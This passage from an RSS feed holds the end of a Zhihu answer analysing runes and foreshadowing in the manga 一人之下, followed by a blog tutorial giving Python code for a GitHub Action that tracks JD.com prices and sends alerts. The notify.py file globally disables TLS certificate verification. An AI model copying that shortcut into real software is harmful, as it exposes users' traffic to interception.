data-private-watermark-src=\"\"></p>\n<p><b>2.卢恩符文</b></p>\n<p>卢恩(Rūna,Rún,Runo,etc...)的原意是秘密、神秘，因此神秘主义者认为奥丁获得了卢恩——宇宙之秘，而这秘密被里格(Ríg，既海姆达尔)传授给人类，并以卢恩字母表的形式表现出来。</p>\n<p>卢恩字母（Runes）又称为如尼字母，是一类已灭绝的字母，用于构成卢恩语，并在中世纪的欧洲，特别是斯堪的纳维亚半岛与不列颠群岛用来书写某些北欧日耳曼语族的语言。 斯堪的纳维亚半岛所用的卢恩文字被称作Futhark，不列颠岛所用的卢恩文字被称作Futhorc，拥有浓重的宗教风味。下图为卢恩符文表；（来自百度）在电影《魔戒》中将卢恩符文作为矮人的魔法文字；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-cdcc4a6dc3ba1d22b3c00749f6b806c2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"440\" data-rawheight=\"255\" data-watermark=\"watermark\" data-original-src=\"v2-cdcc4a6dc3ba1d22b3c00749f6b806c2\" data-watermark-src=\"v2-0592774aa88e381a736463678003610a\" data-private-watermark-src=\"\"></p>\n<p>漫画中以利亚的同伴阿郎和古斯塔所用的就是卢恩符文（鲁纳是另一种翻译而已，就像我习惯把漫画中练气阶段之前的炁，写成气一样，属于个人强迫症，不要在意）从这段剧情来看我们可以得出两个信息，第一，阿郎和古斯塔可能之前认识，甚至有可能出身同门；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-30fb934e8e0d72f5f33cad9133a5d642_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"888\" data-rawheight=\"394\" data-watermark=\"watermark\" data-original-src=\"v2-30fb934e8e0d72f5f33cad9133a5d642\" data-watermark-src=\"v2-52934ea39f1db38c4ae9a764d7c9193a\" data-private-watermark-src=\"\"></p>\n<p>第二，他们的原生教派和中国政府关系还是比较好的，还是非常配合工作的；赵董很快就联系上了这个教派的人，并且知道了阿郎的原本身份；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-763fbc6e98bb35c938efd4c3c31f99e1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"891\" data-rawheight=\"229\" data-watermark=\"watermark\" data-original-src=\"v2-763fbc6e98bb35c938efd4c3c31f99e1\" data-watermark-src=\"v2-2df89586545925b7c39f17745d5882bd\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p><b>欧泽拉符文</b></p>\n<p>古斯塔用血画的符文；“ᛟ”能赋予人在黑暗中看清事物的能力；被称为：欧泽拉；古弗萨克文中的意思为宝贵的土地（庄园）</p>\n<p>通过欧泽拉符文，以利亚清楚的看见了黑暗中的王震球的一举一动；并且能够轻易的判断他的状态；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fa4b31210d12651d92db4e40ff8556de_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"888\" data-rawheight=\"276\" data-watermark=\"watermark\" data-original-src=\"v2-fa4b31210d12651d92db4e40ff8556de\" data-watermark-src=\"v2-61acaa5fe5be9e431757b92ea2985f45\" data-private-watermark-src=\"\"></p>\n<p><b>帝瓦兹符文</b></p>\n<p>古斯塔用血画的符文；可以使人充满力量的符文；拥有激发人体潜能的功效；是提尔的名字；也翻作“泰尔”。在北欧神话中，他是战神，或说象征勇气与英雄的神。顺便一提：因为在古英语中，提尔的读音与“Tiw”相似，所以把他的名字命名为一星期中的第二天。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b7bbdf288aeb438d034c62ee41bb8aba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"890\" data-rawheight=\"237\" data-watermark=\"watermark\" data-original-src=\"v2-b7bbdf288aeb438d034c62ee41bb8aba\" data-watermark-src=\"v2-31fee46a3ae923c61902a7f1e64c011a\" data-private-watermark-src=\"\"></p>\n<p><b>英格瓦兹符文</b></p>\n<p>古斯塔用血画的符文；中心的“ᛜ”字面意思是天使。这个是最对称的一个字母，能表示均衡匀称的状态。同时也代表一种“缓和”的意义，漫画中古斯塔用 英格瓦兹符文来延缓队友的伤势；四周的四个符文ᛁ（冰雪）ᛗ（人）ᛄ（收获）ᛋ（太阳）</p>\n<p>意思仿佛是“人在困境中迎来转机”（这里我瞎猜的，希望有大佬指正）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-42444104994100d65f038dc48a2ced51_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"697\" data-rawheight=\"249\" data-watermark=\"watermark\" data-original-src=\"v2-42444104994100d65f038dc48a2ced51\" data-watermark-src=\"v2-f1de4187320741615b466c1362f56a33\" data-private-watermark-src=\"\"></p>\n<p>同理还有下面这段（字数太多了，我就不瞎猜了，去找找资料再说）</p>\n<p><img src=\"https://pic1.zhimg.com/v2-c9abf7c80dc6d551c7a50ccdab34952c_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"696\" data-rawheight=\"354\" data-watermark=\"watermark\" data-original-src=\"v2-c9abf7c80dc6d551c7a50ccdab34952c\" data-watermark-src=\"v2-b28ff2acd9e585ea6e25f06c05061f81\" data-private-watermark-src=\"\"></p>\n<p><b>未知符文</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c3b5c72035d071f66c382bf44f19f9f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"700\" data-rawheight=\"223\" data-watermark=\"watermark\" data-original-src=\"v2-3c3b5c72035d071f66c382bf44f19f9f\" data-watermark-src=\"v2-7433f3b84dd3f05468ee1a4d3863b417\" data-private-watermark-src=\"\"></p>\n<p><b>言灵</b></p>\n<p>言灵，一词最早出自日文。信者认为在言语中，有着一股不可轻视的力量，誓言或诅咒为其行使的例子。在刘的介绍中古斯塔的能力就包括卢恩符文和言灵；古斯塔曾用来发动治愈伤者的英格瓦兹符文；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-25879880fa09cc03d7c4109ef3ff848d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"697\" data-rawheight=\"227\" data-watermark=\"watermark\" data-original-src=\"v2-25879880fa09cc03d7c4109ef3ff848d\" data-watermark-src=\"v2-31344014c0eb9a25b608599c4297c13f\" data-private-watermark-src=\"\"></p>\n<p><b>3.网络能力者</b></p>\n<p>除了以上这些人外纳森岛应该还拥有和二壮相似的能力；从赵董的言语来看，以利亚等人的入境仿佛也是此人的手笔；是公司的一大隐患；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-94a425ee55a2c6bae242cc341bf05c7a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"891\" data-rawheight=\"358\" data-watermark=\"watermark\" data-original-src=\"v2-94a425ee55a2c6bae242cc341bf05c7a\" data-watermark-src=\"v2-82f759e29c90b20c65c2a0c2bdc9af19\" data-private-watermark-src=\"\"></p>\n<p><b>4.弗拉梅尔 </b></p>\n<p>尼古拉斯·弗拉梅尔，法国人，14世纪的著名炼金术师。其最著名的贡献在于据说制造出了炼金术师的魔法石——贤者之石，并用其成功的将水银变成了黄金。因此，他也被视为欧洲炼金术的始祖。另外，据说他可以利用魔法石而和他的妻子永远长生不老。这一点在《哈利波特》《神奇动物在哪里》系列小说中也有提到。</p>\n<p>值得注意的是在一人之下中这位英国的校长所在的学院也叫弗拉梅尔学院；而他的名字和牛顿一样叫艾萨克；这不得不让人怀疑在《一人》世界中是否真的有贤者之石；（或者我们叫金丹）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-748549b3f9219623a76ccef41c4ed31d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"456\" data-watermark=\"watermark\" data-original-src=\"v2-748549b3f9219623a76ccef41c4ed31d\" data-watermark-src=\"v2-ec71c28d23a4275a72a21d14b16ab510\" data-private-watermark-src=\"\"></p>\n<p>当年塔伯上山，其实伏笔也颇多；比如这里维克多学院的导师（很像斯内普）的这句话：异人这个称呼并不准确...异人这个说法中国一直都有，指非同寻常之人，比如《三国演义》里就写过诸葛亮就说年轻时遇到异人教他呼风唤雨；如果说异人这个称呼不准确那想必是有什么其他更准确的称呼（总不会是魔法师吧）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d0c624f4ee87f7ea5cb2ec4ad24b7d99_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"888\" data-rawheight=\"382\" data-watermark=\"watermark\" data-original-src=\"v2-d0c624f4ee87f7ea5cb2ec4ad24b7d99\" data-watermark-src=\"v2-6043abce2f456efff010c33eddcc7870\" data-private-watermark-src=\"\"></p>\n<p>还有这个著名的伏笔</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a9c84979b4f38ff14afa1913dbc1f267_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"892\" data-rawheight=\"449\" data-watermark=\"watermark\" data-original-src=\"v2-a9c84979b4f38ff14afa1913dbc1f267\" data-watermark-src=\"v2-b941493664e40da9eccfa3578d8bb64d\" data-private-watermark-src=\"\"></p>\n<h2>\n<br><b>神秘人</b> </h2>\n<p><b>1.帽兜男</b></p>\n<p>其实帽兜男这样的画风让老读者很怀念；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cad5907f54c35d948f6a020e3615905b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"661\" data-rawheight=\"304\" data-watermark=\"watermark\" data-original-src=\"v2-cad5907f54c35d948f6a020e3615905b\" data-watermark-src=\"v2-82c89d6e0cde29ac6871299152ac7112\" data-private-watermark-src=\"v2-3ca777f735faf6ae31ba9ae48a2237e3\"></p>\n<p>这个样子和装束很容易让人想到当年二叔画的文兵先生和左慈；</p>\n<p><img src=\"https://pic1.zhimg.com/v2-29aa3ac33d3555df8b2810eafa304956_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"688\" data-rawheight=\"316\" data-watermark=\"watermark\" data-original-src=\"v2-29aa3ac33d3555df8b2810eafa304956\" data-watermark-src=\"v2-801f3ccf9ede701ba6861bd63d1ba6bb\" data-private-watermark-src=\"\"></p>\n<p><b> 2.古崎亭</b></p>\n<p>目前来说，在已出场任务中符合以下几点的也就只有古崎亭和他的大罗洞观了；</p>\n<p>第一，无论哪里都来去自由；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-2691d09ba11ed4a6b907459e12a6b73a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"763\" data-rawheight=\"256\" data-watermark=\"watermark\" data-original-src=\"v2-2691d09ba11ed4a6b907459e12a6b73a\" data-watermark-src=\"v2-7d6fb4d863fe969106e6c765de0f03d6\" data-private-watermark-src=\"\"></p>\n<p>有多自由呢？在这两人说完话的时候，帽兜男就已经消失了；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-14a14e49b94086702ff957f4c8ef6fab_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"760\" data-rawheight=\"402\" data-watermark=\"watermark\" data-original-src=\"v2-14a14e49b94086702ff957f4c8ef6fab\" data-watermark-src=\"v2-2271b4a453f221a563f24059d9900c82\" data-private-watermark-src=\"\"></p>\n<p>在目前已出场的角色中确实也只有大罗洞观有与之类似的效果了；</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6d94604a8b47cce9d1980a7f95d12f2f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"738\" data-rawheight=\"400\" data-watermark=\"watermark\" data-original-src=\"v2-6d94604a8b47cce9d1980a7f95d12f2f\" data-watermark-src=\"v2-f91f5b5793bac206c1eba087c925771f\" data-private-watermark-src=\"\"></p>\n<h2>个人想法  </h2>\n<p>与情节无关，只从作品本身出发的话还是希望不要一直纠结与三十六贼与甲申之乱；毕竟经历这么多话我们应该已经能够理解了；甲申之乱不过是历史中一个比较特殊的小故事罢了；他没记录进普通人的历史（漫画世界观中的）其实也没有做什么真的前无古人的事情；（很多事历代先贤已经做过了）节气谷中发生的故事理应有可能在世界上其他地方在此显现（毕竟节气谷已经没了）</p>\n<p>仅以个人来说还是希望能在作品中看机更远大的目标，去描绘更多异人的世界；</p>\n<p><img src=\"https://pic2.zhimg.com/v2-86a9d6c2f161ee790f82c0cbd8031ae2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1438\" data-rawheight=\"576\" data-watermark=\"watermark\" data-original-src=\"v2-86a9d6c2f161ee790f82c0cbd8031ae2\" data-watermark-src=\"v2-b970c4782cdcaa8a3401ce8fde13f81e\" data-private-watermark-src=\"\"></p>\n<p>（反正王也已经去节气谷了，二者到底有什么渊源到时候应该就能明了了）</p>\n<p><br></p>\n<hr>\n<p><br></p>\n<a href=\"https://www.zhihu.com/column/c_1264966216768692224\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-28243c09e18dc58c62df761ed87850a5_l.jpg\" data-image-width=\"167\" data-image-height=\"167\" class=\"internal\">一人之下•门派录</a><p><img src=\"https://pic4.zhimg.com/v2-5c10e13da4092b73d90f0456e1b82aee_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"467\" data-rawheight=\"254\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>整理不易，跪求点赞<br><br></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-yixiang-68-33?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">呆呆兽星君</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/464193183/answer/1934211068?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">82 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/461565838?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">一人之下张之维，如果对上两豪杰加七佬，是否依然一人一下？</a><br><a href=\"http://www.zhihu.com/question/424721776?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如果想和一人之下中的也总处对象，该怎么办？</a><br>\n","link":"http://www.zhihu.com/question/464193183/answer/1934211068?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 18:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span 